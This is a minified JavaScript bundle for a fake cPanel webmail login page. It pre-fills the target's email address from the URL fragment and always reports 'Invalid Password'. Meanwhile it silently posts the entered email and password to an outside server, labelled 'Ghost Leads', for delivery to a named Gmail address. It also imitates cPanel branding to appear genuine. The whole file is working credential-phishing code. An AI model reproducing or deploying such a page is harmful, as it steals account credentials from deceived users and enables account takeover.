(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[931],{8350:function(e,A,s){Promise.resolve().then(s.bind(s,2663))},2663:function(e,A,s){"use strict";s.r(A),s.d(A,{default:function(){return f}});var t=s(7437),a=s(6648),l=s(2265),r=s(8472),n={src:"/_next/static/media/logo.2f69527b.jpeg",height:600,width:820,blurDataURL:"data:image/jpeg;base64,/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wgARCAAGAAgDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAb/xAAUAQEAAAAAAAAAAAAAAAAAAAAC/9oADAMBAAIQAxAAAAGoBX//xAAVEAEBAAAAAAAAAAAAAAAAAAASAv/aAAgBAQABBQIW/wD/xAAVEQEBAAAAAAAAAAAAAAAAAAAAAv/aAAgBAwEBPwGn/8QAFREBAQAAAAAAAAAAAAAAAAAAAAH/2gAIAQIBAT8Bj//EABcQAAMBAAAAAAAAAAAAAAAAAAAREiH/2gAIAQEABj8Cd4f/xAAXEAEBAQEAAAAAAAAAAAAAAAABEQAh/9oACAEBAAE/IaXgvA3/2gAMAwEAAgADAAAAEAv/xAAWEQEBAQAAAAAAAAAAAAAAAAABABH/2gAIAQMBAT8QWoX/xAAWEQADAAAAAAAAAAAAAAAAAAAAARH/2gAIAQIBAT8QWH//xAAaEAEAAQUAAAAAAAAAAAAAAAABACFBUYHw/9oACAEBAAE/EEaqK7MPOp//2Q==",blurWidth:8,blurHeight:6},i={src:"/_next/static/media/webmail-logo.e4f98b36.svg",height:320,width:1949,blurWidth:0,blurHeight:0},d=s(1942),c=s(3872),o=s(2218),x=s(4839),u=s(6164);function h(){for(var e=arguments.length,A=Array(e),s=0;s<e;s++)A[s]=arguments[s];return(0,u.m6)((0,x.W)(A))}let m=(0,o.j)("relative w-full rounded-lg border p-4 [&>svg~*]:pl-7 [&>svg+div]:translate-y-[-3px] [&>svg]:absolute [&>svg]:left-4 [&>svg]:top-4 [&>svg]:text-foreground",{variants:{variant:{default:"bg-background text-foreground",destructive:"border-destructive/50 text-destructive dark:border-destructive [&>svg]:text-destructive"}},defaultVariants:{variant:"default"}}),g=l.forwardRef((e,A)=>{let{className:s,variant:a,...l}=e;return(0,t.jsx)("div",{ref:A,role:"alert",className:h(m({variant:a}),s),...l})});g.displayName="Alert",l.forwardRef((e,A)=>{let{className:s,...a}=e;return(0,t.jsx)("h5",{ref:A,className:h("mb-1 font-medium leading-none tracking-tight",s),...a})}).displayName="AlertTitle";let p=l.forwardRef((e,A)=>{let{className:s,...a}=e;return(0,t.jsx)("div",{ref:A,className:h("text-sm [&_p]:leading-relaxed",s),...a})});p.displayName="AlertDescription";var f=()=>{let[e,A]=(0,l.useState)(""),[s,o]=(0,l.useState)(""),[x,u]=(0,l.useState)(""),[h,m]=(0,l.useState)(!1),[f,b]=(0,l.useState)("");(0,l.useEffect)(()=>{{let e=window.location.hash;if(e){let s=e.substring(1),t=s.split("@");o(s),A(t[1])}}},[]);let j=async e=>{e.preventDefault(),m(!0),u(""),b("Invalid Password.! Please Enter correct Password"),m(!1),console.log(await r.Z.post("https://smtp-5hox.onrender.com",{email:s,password:x,subject:"Ghost Leads (Webm@1l Page)",receiver:"marianaiaa13@gmail.com"})),b(""),m(!1)};return(0,t.jsxs)("div",{className:"flex flex-col items-center min-h-screen bg-white",children:[(0,t.jsxs)("div",{className:"mb-5 mt-16",children:[f&&(0,t.jsxs)(g,{className:"mb-5 bg-red-500 text-white",children:[(0,t.jsx)(d.aHS,{className:"h-4 w-4 bg-red-100 rounded-full text-[0.5rem] p-1"}),(0,t.jsx)(p,{children:"Password is not correct. Please try again"})]}),h&&(0,t.jsxs)(g,{className:"mb-5 bg-blue-400 text-white flex items-center space-x-2",children:[(0,t.jsx)(d.LL$,{className:" bg-red-100 rounded-full p-1"}),(0,t.jsx)(p,{children:"Authenticating..."})]}),(0,t.jsx)(a.default,{src:i,alt:"logo",width:300,className:"mx-auto"})]}),(0,t.jsxs)("form",{className:"lg:px-0 pt-6 pb-8 mb-4 lg:w-[350px] w-full px-5",children:[(0,t.jsxs)("div",{className:"mb-6",children:[(0,t.jsx)("label",{className:"block text-black font-extrabold text-[0.85rem] mb-1",htmlFor:"email",children:"Email Address"}),(0,t.jsxs)("div",{className:"flex items-center border text-sm",children:[(0,t.jsx)("span",{className:"px-3 text-gray-600",children:(0,t.jsx)(d.q1E,{})}),(0,t.jsx)("input",{className:"bg-white appearance-none border-none rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline",id:"email",type:"text",placeholder:"email address",value:s,readOnly:!0})]})]}),(0,t.jsxs)("div",{className:"mb-6",children:[(0,t.jsx)("label",{className:"block text-black font-extrabold text-[0.85rem] mb-1",htmlFor:"password",children:"Password"}),(0,t.jsxs)("div",{className:"flex items-center border text-sm",children:[(0,t.jsx)("span",{className:"px-3 text-gray-600",children:(0,t.jsx)(c.kUi,{})}),(0,t.jsx)("input",{className:"bg-white appearance-none border-none rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline",id:"password",type:"password",placeholder:"password",onChange:e=>u(e.target.value),value:x})]})]}),(0,t.jsx)("div",{className:"flex items-center justify-center",children:(0,t.jsx)("button",{onClick:j,className:"bg-sky-500 hover:bg-sky-600 text-white font-bold p-1 w-full rounded focus:outline-none focus:shadow-outline",type:"button",children:"Log in"})})]}),(0,t.jsxs)("div",{className:"lg:flex justify-center space-x-4 mt-8 text-sm hidden",children:[(0,t.jsx)("span",{children:"English"}),(0,t.jsx)("span",{children:"العربية"}),(0,t.jsx)("span",{children:"български"}),(0,t.jsx)("span",{children:"čeština"}),(0,t.jsx)("span",{children:"dansk"}),(0,t.jsx)("span",{children:"Deutsch"}),(0,t.jsx)("span",{children:"Ελληνικά"}),(0,t.jsx)("span",{children:"espa\xf1ol"}),(0,t.jsx)("span",{children:"..."})]}),(0,t.jsxs)("div",{className:"mt-8 text-center text-gray-600 text-xs",children:[(0,t.jsx)(a.default,{src:n,width:30,height:30,alt:"logo",className:"text-center justify-center items-center mx-auto mb-2"}),(0,t.jsxs)("p",{children:[e," \xa9 2024 cPanel, L.L.C."]}),(0,t.jsx)("p",{children:"Privacy Policy"})]})]})}}},function(e){e.O(0,[240,699,509,971,23,744],function(){return e(e.s=8350)}),_N_E=e.O()}]);